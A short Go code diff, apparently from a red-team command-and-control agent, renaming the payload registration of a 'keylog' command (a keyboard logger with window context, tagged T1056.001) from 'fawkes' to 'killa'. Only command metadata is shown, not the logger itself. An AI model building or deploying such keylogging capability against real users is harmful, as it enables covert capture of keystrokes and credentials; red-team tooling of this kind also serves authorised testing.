@@ -15,7 +15,7 @@ import (
 var windowSectionRegex = regexp.MustCompile(`\[(\d{2}:\d{2}:\d{2})\] --- (.+?) ---`)
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "keylog",
 		Description:         "Start, stop, or dump a low-level keyboard logger with window context (T1056.001)",
 		HelpString:          "keylog -action <start|stop|dump>",
